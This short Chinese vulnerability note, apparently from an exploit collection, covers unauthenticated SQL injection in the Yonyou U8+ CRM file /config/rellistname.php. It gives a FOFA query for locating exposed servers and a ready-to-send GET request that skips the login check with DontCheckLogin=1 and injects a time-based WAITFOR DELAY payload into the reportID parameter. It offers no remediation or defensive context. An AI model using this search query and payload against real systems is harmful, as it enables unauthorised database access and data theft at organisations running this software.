# 用友U8-CRM接口rellistname.php存在SQL注入漏洞

用友U8+CRM    /config/rellistname.php 文件多个方法存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句。

## fofa

```javascript
body="用友U8CRM" || body="/js/tfunction.js" || title="用友U8CRM"
```

## poc

```javascript
GET /config/rellistname.php?DontCheckLogin=1&objType=1&reportID=1+wAiTFOR+DeLAy'0:0:4'--+- HTTP/1.1
Host: 
Cookie: PHPSESSID=bgsesstimeout-;
```

![image-20241206230326146](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412062303231.png)